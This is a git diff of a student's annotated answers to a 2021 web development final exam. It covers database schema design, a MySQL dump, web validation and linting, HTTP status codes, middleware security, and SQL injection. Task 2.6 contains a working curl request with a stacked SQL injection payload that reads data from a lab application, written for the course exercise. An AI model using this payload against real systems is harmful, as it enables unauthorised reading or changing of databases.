@@ -1,10 +1,40 @@
+
+
+# Final Exam 2021 S1 WDC
+
 ## Task 1.1
+
+
+Design a database schema diagram for the system described.
+
+- Be sure to include appropriate relationships and cardinalities.
+- Be sure to normalise the schema to at least 3rd normal form.
+
+ 
+
+Upload the file as an image or pdf
+
+25/30
+
+---
 
 
 
 ![wdc-final-preparation-Page-3-1](https://minio.llycloud.com/image/uPic/image-20210706QZZGHQ.png) 
 
+
+
 ## Task 1.2
+
+When building a database schema, N-N relationships need to be properly reduced/decomposed.
+
+Briefly discuss how this applies to the system you've designed in Task 1.1 and, specifically in terms of your system and its relationships, explain how this relates to database normalisation.
+
+10/10
+
+---
+
+
 
 In the database scheme attached above, there is N-N relationships between user table and game table which connected by join table -- order table. 
 
@@ -22,7 +52,243 @@ Based on 2nd normal form,when a composite key is used (a primary key consisting 
 
 Based on 3rd normal form, every columns are not reference other colums that aren's keys. The references only appear on foreign key connected to primary key. 
 
+
+
+## Task 1.3
+
+Implement your database schema from Task 1.1 in MySQL
+
+When you create the database
+
+- Ensure appropriate tables, data types, keys and integrity constraints are present.
+- Add at least 1 row of test data to each table.
+
+30/30
+
+---
+
+```sql
+-- MySQL dump 10.13  Distrib 8.0.25, for Linux (x86_64)
+--
+-- Host: 127.0.0.1    Database: wdc-final
+-- ------------------------------------------------------
+-- Server version	8.0.19-0ubuntu5
+
+/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
+/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
+/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
+/*!50503 SET NAMES utf8mb4 */;
+/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
+/*!40103 SET TIME_ZONE='+00:00' */;
+/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
+/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
+/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
+/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;
+
+
+--
+-- Current Database: `wdc-final`
+--
+
+CREATE DATABASE /*!32312 IF NOT EXISTS*/ `wdc-final` /*!40100 DEFAULT CHARACTER SET utf8 */;
+
+USE `wdc-final`;
+
+--
+-- Table structure for table `category`
+--
+
+DROP TABLE IF EXISTS `category`;
+/*!40101 SET @saved_cs_client     = @@character_set_client */;
+/*!50503 SET character_set_client = utf8mb4 */;
+CREATE TABLE `category` (
+  `category_id` int NOT NULL AUTO_INCREMENT,
+  `category_name` varchar(255) NOT NULL,
+  `category_description` varchar(255) DEFAULT NULL,
+  PRIMARY KEY (`category_id`)
+) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8;
+/*!40101 SET character_set_client = @saved_cs_client */;
+
+--
+-- Dumping data for table `category`
+--
+
+LOCK TABLES `category` WRITE;
+/*!40000 ALTER TABLE `category` DISABLE KEYS */;
+INSERT INTO `category` VALUES (1,'Action games','Action games desc'),(2,'Action-adventure games','Action-adventure games desc'),(3,'Adventure games','Adventure games desc'),(4,'Role-playing games','Role-playing games desc'),(5,'Simulation games','Simulation games desc'),(6,'Strategy games','Strategy games desc');
+/*!40000 ALTER TABLE `category` ENABLE KEYS */;
+UNLOCK TABLES;
+
+--
+-- Table structure for table `game`
+--
+
+DROP TABLE IF EXISTS `game`;
+/*!40101 SET @saved_cs_client     = @@character_set_client */;
+/*!50503 SET character_set_client = utf8mb4 */;
+CREATE TABLE `game` (
+  `game_id` int NOT NULL AUTO_INCREMENT,
+  `game_name` varchar(255) NOT NULL,
+  `category` int DEFAULT NULL,
+  `platform` int DEFAULT NULL,
+  `features` varchar(255) DEFAULT NULL,
+  `price` double(13,2) DEFAULT NULL,
+  PRIMARY KEY (`game_id`),
+  KEY `game_platform_platform_id_fk` (`platform`),
+  KEY `game_category_category_id_fk` (`category`),
+  CONSTRAINT `game_category_category_id_fk` FOREIGN KEY (`category`) REFERENCES `category` (`category_id`),
+  CONSTRAINT `game_platform_platform_id_fk` FOREIGN KEY (`platform`) REFERENCES `platform` (`platform_id`)
+) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8;
+/*!40101 SET character_set_client = @saved_cs_client */;
+
+--
+-- Dumping data for table `game`
+--
+
+LOCK TABLES `game` WRITE;
+/*!40000 ALTER TABLE `game` DISABLE KEYS */;
+INSERT INTO `game` VALUES (1,'game_01',1,1,'featrues_1',25.56),(2,'game_02',2,2,'featrues_2',35.66),(3,'game_03',3,3,'featrues_3',14.50),(4,'game_04',4,4,'featrues_4',27.77),(5,'game_05',5,5,'featrues_5',40.99),(6,'game_06',6,1,'featrues_6',19.99);
+/*!40000 ALTER TABLE `game` ENABLE KEYS */;
+UNLOCK TABLES;
+
+--
+-- Table structure for table `order`
+--
+
+DROP TABLE IF EXISTS `order`;
+/*!40101 SET @saved_cs_client     = @@character_set_client */;
+/*!50503 SET character_set_client = utf8mb4 */;
+CREATE TABLE `order` (
+  `user_id` int DEFAULT NULL,
+  `game_id` int DEFAULT NULL,
+  `order_id` int NOT NULL AUTO_INCREMENT,
+  `purchase_timestamp` datetime DEFAULT NULL,
+  PRIMARY KEY (`order_id`),
+  KEY `order_user_user_id_fk` (`user_id`),
+  KEY `order_game_game_id_fk` (`game_id`),
+  CONSTRAINT `order_game_game_id_fk` FOREIGN KEY (`game_id`) REFERENCES `game` (`game_id`),
+  CONSTRAINT `order_user_user_id_fk` FOREIGN KEY (`user_id`) REFERENCES `user` (`user_id`)
+) ENGINE=InnoDB AUTO_INCREMENT=15 DEFAULT CHARSET=utf8;
+/*!40101 SET character_set_client = @saved_cs_client */;
+
+--
+-- Dumping data for table `order`
+--
+
+LOCK TABLES `order` WRITE;
+/*!40000 ALTER TABLE `order` DISABLE KEYS */;
+INSERT INTO `order` VALUES (1,2,1,'2021-06-30 13:23:51'),(5,4,6,'2021-06-19 13:23:51'),(6,1,7,'2021-06-17 13:23:51'),(4,4,8,'2021-06-21 13:23:51'),(5,1,9,'2021-06-20 13:23:51'),(4,6,10,'2021-04-30 13:23:51'),(5,2,11,'2021-06-22 13:23:51'),(4,1,12,'2021-05-30 13:23:51'),(1,6,13,'2021-04-25 13:23:51'),(7,6,14,'2020-04-25 13:23:51');
+/*!40000 ALTER TABLE `order` ENABLE KEYS */;
+UNLOCK TABLES;
+
+--
+-- Table structure for table `platform`
+--
+
+DROP TABLE IF EXISTS `platform`;
+/*!40101 SET @saved_cs_client     = @@character_set_client */;
+/*!50503 SET character_set_client = utf8mb4 */;
+CREATE TABLE `platform` (
+  `platform_id` int NOT NULL AUTO_INCREMENT,
+  `platform_name` varchar(255) NOT NULL,
+  `platform_description` varchar(1024) DEFAULT NULL,
+  PRIMARY KEY (`platform_id`)
+) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8;
+/*!40101 SET character_set_client = @saved_cs_client */;
+
+--
+-- Dumping data for table `platform`
+--
+
+LOCK TABLES `platform` WRITE;
+/*!40000 ALTER TABLE `platform` DISABLE KEYS */;
+INSERT INTO `platform` VALUES (1,'console','console_platform'),(2,'PC','PC_platform'),(3,'Mac','Mac_platform'),(4,'IOS','IOS_platform'),(5,'Android','android_platform');
+/*!40000 ALTER TABLE `platform` ENABLE KEYS */;
+UNLOCK TABLES;
+
+--
+-- Table structure for table `user`
+--
+
+DROP TABLE IF EXISTS `user`;
+/*!40101 SET @saved_cs_client     = @@character_set_client */;
+/*!50503 SET character_set_client = utf8mb4 */;
+CREATE TABLE `user` (
+  `user_id` int NOT NULL AUTO_INCREMENT,
+  `username` varchar(255) NOT NULL,
+  `password` varchar(255) NOT NULL,
+  `email_address` varchar(255) DEFAULT NULL,
+  `address` int DEFAULT NULL,
+  `phone_number` int NOT NULL,
+  `create_by` varchar(255) DEFAULT NULL,
+  `create_time` date DEFAULT NULL,
+  `update_by` varchar(255) DEFAULT NULL,
+  `update_time` date DEFAULT NULL,
+  PRIMARY KEY (`user_id`),
+  UNIQUE KEY `user_phone_number_uindex` (`phone_number`),
+  UNIQUE KEY `user_username_uindex` (`username`),
+  UNIQUE KEY `user_email_address_uindex` (`email_address`),
+  KEY `user_user_address_address_id_fk` (`address`),
+  CONSTRAINT `user_user_address_address_id_fk` FOREIGN KEY (`address`) REFERENCES `user_address` (`address_id`)
+) ENGINE=InnoDB AUTO_INCREMENT=8 DEFAULT CHARSET=utf8;
+/*!40101 SET character_set_client = @saved_cs_client */;
+
+--
+-- Dumping data for table `user`
+--
+
+LOCK TABLES `user` WRITE;
+/*!40000 ALTER TABLE `user` DISABLE KEYS */;
+INSERT INTO `user` VALUES (1,'Akide_Liu','IAMpassword','mail@llycloud.com',1,450460666,'Admin','2021-06-16','Admin','2021-06-16'),(4,'Akide_Liu1','IAMpassword','mail1@llycloud.com',1,450460661,'Admin','2021-06-16','Admin','2021-06-16'),(5,'Akide_Liu2','IAMpassword','mail2@llycloud.com',1,450460662,'Admin','2021-06-16','Admin','2021-06-16'),(6,'Akide_Liu3','IAMpassword','mail3@llycloud.com',1,450460663,'Admin','2021-06-16','Admin','2021-06-16'),(7,'Akide_Liu4','IAMpassword','mail4@llycloud.com',1,450460664,'Admin','2021-06-16','Admin','2021-06-16');
+/*!40000 ALTER TABLE `user` ENABLE KEYS */;
+UNLOCK TABLES;
+
+--
+-- Table structure for table `user_address`
+--
+
+DROP TABLE IF EXISTS `user_address`;
+/*!40101 SET @saved_cs_client     = @@character_set_client */;
+/*!50503 SET character_set_client = utf8mb4 */;
+CREATE TABLE `user_address` (
+  `address_id` int NOT NULL AUTO_INCREMENT,
+  `street_address` varchar(1024) NOT NULL,
+  `suburb_town` varchar(255) NOT NULL,
+  `state` varchar(255) NOT NULL,
+  `country` varchar(255) NOT NULL,
+  `postCode` varchar(20) NOT NULL,
+  PRIMARY KEY (`address_id`)
+) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
+/*!40101 SET character_set_client = @saved_cs_client */;
+
+--
+-- Dumping data for table `user_address`
+--
+
+LOCK TABLES `user_address` WRITE;
+/*!40000 ALTER TABLE `user_address` DISABLE KEYS */;
+INSERT INTO `user_address` VALUES (1,'421 King William St','Adelaide','SA','AU','5000');
+/*!40000 ALTER TABLE `user_address` ENABLE KEYS */;
+UNLOCK TABLES;
+/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;
+
+/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
+/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
+/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
+/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
+/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
+/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
+/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;
+
+-- Dump completed on 2021-06-30 18:59:56
+
+```
+
+
+
 ## Task 1.4
+
+8/10
 
 ```sql
 select username,email_address
@@ -40,9 +306,42 @@ GROUP BY user.user_id
 
 ```
 
+## Task 1.5
 
+Implement a basic web application for the search feature of this online shop.
+
+- Use only the technologies covered in this course:
+  - HTML & CSS
+  - JavaScript, AJAX, & basic client-side Vue.js
+  - NodeJS/Express
+  - MySQL
+- Only implement the search page/feature and any necessary supporting code on the server.
+- Users should also be able to filter search results by:
+  - Genre/Category
+  - Platform (console/PC etc.)
+  - Features
+  - Price
+- Be sure to follow best practices as discussed throughout the course.
+
+ 
+
+Excluding the node_modules folder, submit/upload your implementation as a zip file
+
+160/160
 
 ## Task 1.6
+
+[Steam](https://store.steampowered.com/) is an example of an online shop that sells video games.
+
+Identify a feature present in both the Steam website, and your implementation from Task 1.5.
+
+Specifically in terms of operability and understandability, discuss how these two systems compare.
+
+15/15
+
+---
+
+
 
 Compare my implementation to `https://store.steampowered.com/`, we both implementation the search system which adapted possibility for end user easily access / filter the required game by category, platform, features, price.
 
@@ -88,7 +387,19 @@ Both of steam and my workaround, every button has been properly labeled and ever
 
 For display result, the steam do not have table head to point at the purpose of search results. My implementation have a table title to classify the purpose of research results which makes user's more easily to understand the search results.
 
+
+
 ## Task 2.1
+
+The files provided contain a number of HTML & CSS validation errors
+
+Identify the validation errors and in terms of those specific errors discuss the benefits and disadvantages of how modern web browsers handle invalid HTML & CSS.
+
+12/15
+
+---
+
+
 
 ```sql
 vnu --also-check-css $(find ./ | grep -v 'node_modules' | egrep '.html|.css' | sed -r 's/\\/\\//\\//g')
@@ -98,13 +409,31 @@ vnu --also-check-css $(find ./ | grep -v 'node_modules' | egrep '.html|.css' | s
 "file:/Users/akide/IdeaProjects/WDC/Final/exam_part2/./public/stylesheets/style.css":77.1-77.4: error: CSS: Parse Error.
 ```
 
-Css HTML validator can increase the website's quality score by helping find and fix broken links, broken redirects, and misspelled words. 
+Css HTML validator can increase the website's quality score by helping find and fix broken links, broken redirects, and misspelled words.
 
-Validating with css html validator helps to make the website more accessible. 
+Validating with css html validator helps to make the website more accessible.
 
-The core reason to run your html document through a conformance checker is simple : to catch unintended mistakes. 
+The core reason to run your html document through a conformance checker is simple : to catch unintended mistakes.
+
+ Benefits :
+
+The browser will base works when there are micro mistake of most based tag misspelled or not closed (div tag ,p tag, span tag). Even the html / css is not valid, the browser will try best to display content to minimize the impact of end user. But, this rule is not working for advanced html tag or css style, for example, a invalid img tag will result the image could not load properly.
+
+Disadvantages :
+
+With the rapid technology growth, the modern browser might be able to tolerate more tags and invalid tags or style. There is a good approach for reduce the impact to the end user. However, when modern browsers handle more invalid html/css. The developers will not pay much attention to the issues of html/css error and do not realize the importance of valid html. Without properly linting and validation, lots of micro erros will produce huge bad effort which directly reduce the accessibility of the web application. So that we need validation all of html/css document before these files moved into production which could minimize the predicable impact to end user.
 
 ## Task 2.2
+
+The provided index.js JavaScript file in the routes folder also contain a number of linting errors for the linting rules used in this course.
+
+Identify the linting errors and in terms of those specific errors discuss the role that linting plays in the development of error-free code.
+
+10/15
+
+---
+
+
 
 ```sql
 eslint $(find ./ -name '*.js'| grep -v 'node_modules' | sed -r 's/\\/\\//\\//g')
@@ -151,6 +480,14 @@ As the javascript is a dynamic and loosely-typed language, is especially prone t
 
 ## Task 2.3
 
+Specifically using examples from this Part 2 web application, explain the purpose and role of HTTP status codes in web systems.
+
+13/15
+
+---
+
+
+
 The http status code played in the role which let frontend to understand the status of server's response. for instance, 2xx class codes refer success responses. 4xx class codes refer client erros, 5xx class code rfer server errors. When client side js receive the different https status code, they can determine the is the response success or not, if the response failed, client side js could react the properly action to notify end user based on different type of error -- client side error or server side error. 
 
 ```js
@@ -178,6 +515,19 @@ res.sendStatus(500);
 The 500 https status code refers the server has encountered a situation it doest't know how to handle. Based on the code, these 500 codes most often have been produced by server side issues such as the connection to database is unreachable, or the query is not able to execute. in other words, these issues always related server side misconfigurations, code issues, unreliable/unreachable integration services (mysql database) or maybe the server has been hacked by attack. Therefore could not able to produce correct compture to retrieve data as user requested. 
 
 ## Task2.4
+
+Discuss the role that middleware plays in the security of this web application and identify any issues with the way that the middleware in this web application is implemented.
+
+8/20
+
+**What we were looking for:**
+
+- You've discussed the role of middleware in the security of this web app specifically.
+- You've identified the issue with one of the routes that allows the middleware to be skipped for that route.
+
+---
+
+
 
 The middleware played the role for web security in nodejs ecosystem. The middleware could place in front of real production route which provide functionality. For example, we could use `helmet` middleware to prevent http header vulnerabilities and place `express-brute` to rate limit the authorization end point and `express-html-sanitizer` for prevent xss attack.
 
@@ -319,6 +669,16 @@ There are a few research for how to secure the node.js web application by middle
 
 ## Task 2.5
 
+This web application contains a SQL injection vulnerability. 
+
+Identify the vulnerability and explain the consequences of SQL injection in terms of this vulnerability.
+
+20/20
+
+---
+
+
+
 Investigation flow :
 
 1. Looking for which query did not use proper preparation statement Then we found following code contains vulnerability from `/addpost` endpoint in `index.js`
@@ -362,9 +722,22 @@ Investigation flow :
                      LEFT JOIN q_up ON q_up.question = questions.q_id;`;
    ```
 
+![Untitled(6)](https://minio.llycloud.com/image/uPic/image-20210716aYoA65.png)
+
 ## Task 2.6
 
-![Untitled(6)](https://minio.llycloud.com/image/uPic/image-20210706mMPoIS.png)
+Using the vulnerability identified in 2.5, use Insomnia to craft and test an exploit that does one of the following:
+
+- Modifies data in the database without authorisation
+- Reveals data from the database without authorisation
+
+ Use the Copy as Curl option to copy the request for this exploit and paste it in the box below:
+
+25/30
+
+---
+
+
 
 ```bash
 curl --request POST \
@@ -377,3 +750,30 @@ curl --request POST \
 	"tags":["test'\'',LAST_INSERT_ID());INSERT INTO question_tags (tagname, question)VALUES ((select version()), LAST_INSERT_ID());-- -"],
 	"upvotes":0}'
 ```
+
+
+
+## Task 2.7
+
+Using the list below, fix the issues and make the improvements identified.
+
+- Fix the validation and linting issues identified in 2.1 & 2.2.
+- Fix any issues with the middleware in this web application as identified in 2.4.
+- Fix the SQL injection vulnerability identified in 2.5.
+
+ Excluding the node-modules folder, submit/upload the fixed/improved web applicaiton as a zip file
+
+[80 marks]
+Consisting of
+
+- 20 marks for validation and linting issues fixed
+- 30 marks for middleware issues fixed
+- 30 marks for SQL injection issues fixed
+
+57.25/80
+
+---
+
+## Exam Notes & Feedback
+
+![img](./2021-07-16_02-54-11.png)
